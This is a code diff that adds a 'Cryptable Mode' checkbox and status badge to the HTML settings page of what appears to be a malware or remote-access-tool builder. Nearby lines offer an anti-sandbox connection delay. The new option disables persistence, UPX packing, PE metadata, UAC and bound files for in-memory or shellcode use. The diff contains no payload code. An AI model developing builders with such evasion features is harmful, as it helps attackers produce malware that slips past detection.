@@ -302,6 +302,22 @@
                       <p class="text-xs text-slate-500">Sleep N seconds before connecting (anti-sandbox). Set to 0 to disable.</p>
                     </div>
 
+                    <label class="flex items-center gap-2 p-3 bg-purple-900/30 border border-purple-500/40 rounded-lg cursor-pointer hover:border-purple-400 transition-colors">
+                      <input type="checkbox" id="cryptable-mode" name="cryptable-mode" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-microchip text-purple-400"></i> Cryptable Mode
+                        </span>
+                        <span class="text-xs text-slate-500">Disables persistence, UPX, PE metadata, UAC, bound files &amp; other disk-dependent settings for in-memory / shellcode use</span>
+                      </div>
+                    </label>
+                    <div id="cryptable-badge" class="hidden pl-3 border-l-2 border-purple-500/40">
+                      <div class="flex items-center gap-2 px-3 py-1.5 rounded bg-purple-800/40 border border-purple-600/40 text-xs text-purple-300">
+                        <i class="fa-solid fa-circle-check"></i>
+                        <span>Cryptable mode active — incompatible settings have been disabled</span>
+                      </div>
+                    </div>
+
                   </div>
                 </div>
               </div>
